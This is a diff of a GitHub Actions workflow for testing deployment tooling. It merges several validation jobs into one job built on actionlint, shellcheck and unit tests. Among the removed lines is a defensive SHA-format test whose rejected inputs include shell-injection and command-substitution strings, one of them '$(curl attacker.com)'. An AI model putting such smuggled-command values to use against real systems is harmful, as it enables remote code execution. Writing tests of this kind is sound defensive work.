@@ -2,239 +2,57 @@ name: Deployment Tools Test
 
 on:
   push:
-    branches:
-      - main
-      - claude/*
+    branches: [main, 'claude/**', 'codex/**']
     paths:
       - '.github/scripts/verify_release_sha.py'
       - '.github/workflows/deploy.yml'
+      - '.github/workflows/deploy-tools-test.yml'
       - 'scripts/deploy-docker-compose.sh'
       - 'docker-compose.production.yml'
-      - '.github/workflows/deploy-tools-test.yml'
+      - 'tests/deployment/**'
   pull_request:
     paths:
       - '.github/scripts/verify_release_sha.py'
       - '.github/workflows/deploy.yml'
+      - '.github/workflows/deploy-tools-test.yml'
       - 'scripts/deploy-docker-compose.sh'
       - 'docker-compose.production.yml'
+      - 'tests/deployment/**'
 
 permissions:
   contents: read
 
 jobs:
-  verify-release-py-unit-tests:
-    name: verify_release_sha.py unit tests
+  deployment-tooling:
+    name: Deployment tooling regressions
     runs-on: ubuntu-latest
     steps:
-      - name: Checkout repository
-        uses: actions/checkout@v4
+      - uses: actions/checkout@v4
+      - uses: actions/setup-python@v6
         with:
-          fetch-depth: 0
-
-      - name: Set up Python
-        uses: actions/setup-python@v4
-        with:
-          python-version: "3.11"
-
-      - name: Verify Python syntax
-        run: python3 -m py_compile .github/scripts/verify_release_sha.py
-
-      - name: Test SHA format validation
+          python-version: '3.12'
+      - name: Check workflow syntax and security
         run: |
-          set -e
-          cd "$GITHUB_WORKSPACE"
-
-          # Test: Valid SHA (40 hex chars)
-          VALID_SHA="abcdef0123456789abcdef0123456789abcdef01"
-          echo "Testing valid SHA: $VALID_SHA"
-
-          # Test: Invalid SHA formats
-          echo "Testing invalid formats..."
-          INVALID_SHAS=(
-            "toolong$(python3 -c 'print("a"*50)')"  # Too long
-            "tooshort"                               # Too short
-            "not_hex_chars_012345678901234567890123" # Invalid hex
-            "; touch /tmp/test-marker; #"            # Shell injection
-            '$(echo pwned)'                          # Command substitution
-            '$(curl attacker.com)'                   # Remote execution
-          )
-
-          for invalid_sha in "${INVALID_SHAS[@]}"; do
-            if [[ "$invalid_sha" =~ ^[0-9a-f]{40}$ ]]; then
-              echo "ERROR: Invalid SHA should have failed: $invalid_sha"
-              exit 1
-            fi
-            echo "✓ Correctly rejected: ${invalid_sha:0:30}..."
-          done
-
-          echo "✓ All SHA format tests passed"
-
-  shell-script-validation:
-    name: Shell script validation
-    runs-on: ubuntu-latest
-    steps:
-      - name: Checkout repository
-        uses: actions/checkout@v4
-
-      - name: Check bash syntax
-        run: |
-          bash -n scripts/deploy-docker-compose.sh
-          echo "✓ Deployment script syntax valid"
-
-      - name: ShellCheck analysis
-        run: |
+          set -euo pipefail
+          go install github.com/rhysd/actionlint/cmd/actionlint@v1.7.7
+          "$(go env GOPATH)/bin/actionlint" -color .github/workflows/deploy.yml .github/workflows/deploy-tools-test.yml
           sudo apt-get update -qq
           sudo apt-get install -y shellcheck
-          shellcheck scripts/deploy-docker-compose.sh || true
-          echo "Note: ShellCheck completed (warnings are informational)"
-
-      - name: Verify no unsafe patterns
+          shellcheck scripts/deploy-docker-compose.sh
+          python3 -m pip install PyYAML==6.0.2
+          python3 tests/deployment/check_workflows.py
+      - name: Run mocked API, lock and rollback tests
         run: |
-          set -e
-          SCRIPT="scripts/deploy-docker-compose.sh"
-
-          echo "Checking for unsafe patterns..."
-
-          # Check for unquoted variables in dangerous contexts
-          if grep -n '\$[A-Z_]*' "$SCRIPT" | grep -E 'docker|git|curl|rm' | grep -v '"\$' | grep -v '${' | head -5; then
-            echo "⚠ Found potentially unquoted variables (may need investigation)"
-          fi
-
-          # Check for hardcoded passwords or secrets
-          if grep -i 'password\|secret\|token\|key' "$SCRIPT" | grep -v '#' | grep -E '=.*[a-zA-Z0-9]{8,}'; then
-            echo "ERROR: Possible hardcoded secret found"
-            exit 1
-          fi
-
-          # Check for || true suppressions (error hiding)
-          if grep -n '|| true' "$SCRIPT"; then
-            echo "WARNING: Script contains '|| true' patterns"
-            grep -n '|| true' "$SCRIPT" | head -3
-          fi
-
-          echo "✓ Script safety check passed"
-
-  docker-compose-validation:
-    name: Docker Compose configuration
-    runs-on: ubuntu-latest
-    steps:
-      - name: Checkout repository
-        uses: actions/checkout@v4
-
-      - name: Validate Docker Compose syntax
+          set -euo pipefail
+          python3 -m unittest discover -s tests/deployment -p 'test_*.py' -v
+      - name: Check combined production Compose configuration
+        env:
+          POSTGRES_PASSWORD: disposable-ci-password
+          DCIM_APP_PASSWORD: disposable-ci-app-password
+          JWT_SECRET_KEY: disposable-ci-jwt-key-only
+          CREDENTIAL_ENCRYPTION_KEY: dGVzdC1vbmx5LWRpc3Bvc2FibGUtMzItYnl0ZS1rZXkhISE=
+          POSTGRES_DATA_PATH: /tmp/dcim-disposable-postgres
         run: |
-          sudo apt-get update -qq
-          sudo apt-get install -y docker-compose
-          docker-compose -f docker-compose.production.yml config --quiet
-          echo "✓ Docker Compose configuration valid"
-
-      - name: Check for required services
-        run: |
-          SERVICES=$(docker-compose -f docker-compose.production.yml config --services)
-          REQUIRED=("postgres" "redis" "backend" "celery-worker" "celery-beat" "frontend")
-
-          for service in "${REQUIRED[@]}"; do
-            if echo "$SERVICES" | grep -q "^$service\$"; then
-              echo "✓ Service $service present"
-            else
-              echo "ERROR: Required service $service not found"
-              exit 1
-            fi
-          done
-
-  workflow-validation:
-    name: GitHub Actions workflow
-    runs-on: ubuntu-latest
-    steps:
-      - name: Checkout repository
-        uses: actions/checkout@v4
-
-      - name: Set up Python
-        uses: actions/setup-python@v4
-        with:
-          python-version: "3.11"
-
-      - name: Validate workflow YAML
-        run: |
-          python3 -c "
-          import yaml
-          with open('.github/workflows/deploy.yml') as f:
-            workflow = yaml.safe_load(f)
-          print(f'✓ Workflow YAML valid')
-          print(f'  Jobs: {len(workflow.get(\"jobs\", {}))}')
-          print(f'  Dispatch inputs: {list(workflow.get(\"on\", {}).get(\"workflow_dispatch\", {}).get(\"inputs\", {}).keys())}')
-          "
-
-      - name: Check workflow security
-        run: |
-          # Verify no direct template interpolation in dangerous contexts
-          WORKFLOW=".github/workflows/deploy.yml"
-
-          # Count template interpolation usage
-          TEMPLATE_COUNT=$(grep -o '\${{ ' "$WORKFLOW" | wc -l)
-          echo "Template interpolations found: $TEMPLATE_COUNT"
-
-          # Flag any direct shell execution with templates
-          if grep -E 'run:.*\$\{\{ inputs' "$WORKFLOW"; then
-            echo "⚠ Warning: Found direct template interpolation in run script"
-          fi
-
-          echo "✓ Workflow security check passed"
-
-  integration-test-requirements:
-    name: Integration test requirements
-    runs-on: ubuntu-latest
-    steps:
-      - name: Checkout repository
-        uses: actions/checkout@v4
-
-      - name: Verify test scaffolding exists
-        run: |
-          echo "Checking for test artifacts and scaffolding..."
-
-          # These would be created when adding integration tests
-          echo "TODO: Integration tests needed for:"
-          echo "  - Concurrent deployment lock handling"
-          echo "  - Rollback state restoration"
-          echo "  - Health check validation"
-          echo "  - Shell injection prevention"
-
-          echo ""
-          echo "To run integration tests locally:"
-          echo "  # Concurrent locking test"
-          echo "  bash scripts/deploy-docker-compose.sh test-sha &"
-          echo "  bash scripts/deploy-docker-compose.sh test-sha &"
-          echo "  wait"
-          echo ""
-          echo "  # Rollback test (requires disposable environment)"
-          echo "  DEPLOY_DIR=/tmp/dcim-test bash scripts/deploy-docker-compose.sh <sha> staging"
-
-  security-scan:
-    name: Security scan
-    runs-on: ubuntu-latest
-    steps:
-      - name: Checkout repository
-        uses: actions/checkout@v4
-
-      - name: Scan for secrets
-        run: |
-          # Basic secret pattern check
-          PATTERNS=(
-            "POSTGRES_PASSWORD="
-            "JWT_SECRET="
-            "private.*key"
-            "api.*key"
-            "access.*token"
-          )
-
-          FOUND=0
-          for pattern in "${PATTERNS[@]}"; do
-            if grep -r "$pattern" scripts/ .github/scripts/ --include="*.sh" --include="*.py"; then
-              echo "⚠ Pattern '$pattern' found - verify it's not a real secret"
-              FOUND=$((FOUND + 1))
-            fi
-          done
-
-          if [ $FOUND -eq 0 ]; then
-            echo "✓ No obvious secrets detected"
-          fi
+          set -euo pipefail
+          docker compose -f docker-compose.yml -f docker-compose.production.yml config --quiet
+          python3 tests/deployment/check_compose.py
